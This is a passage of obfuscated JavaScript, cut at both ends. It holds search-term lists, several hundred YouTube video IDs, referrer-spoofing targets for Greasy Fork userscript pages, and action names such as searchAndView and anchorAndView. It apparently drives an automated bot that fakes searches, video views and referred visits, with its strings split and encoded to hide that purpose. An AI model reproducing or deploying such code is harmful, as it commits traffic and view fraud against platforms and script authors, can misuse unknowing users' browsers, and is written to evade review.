'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1003 + -0x44b * 0x6 + 0x9c9)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x8 * 0x3d7 + 0x1458 + 0x2b * 0x3e)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + X(0x13, 'q%n2') + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x910 + -0x1 * -0x1e2b + -0x3ec * 0xa);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    Y(0x1b) + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    X(0xb, 'qSgc') + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    Y(0xe) + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    Y(0x7) + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    X(0x19, 'kfaM') + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    X(0xd, 'j4Ot') + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    Z(0x16) + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + X(0x4, 'sTrA') + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + Y(0x14) + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + X(0x9, 'Zz41'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
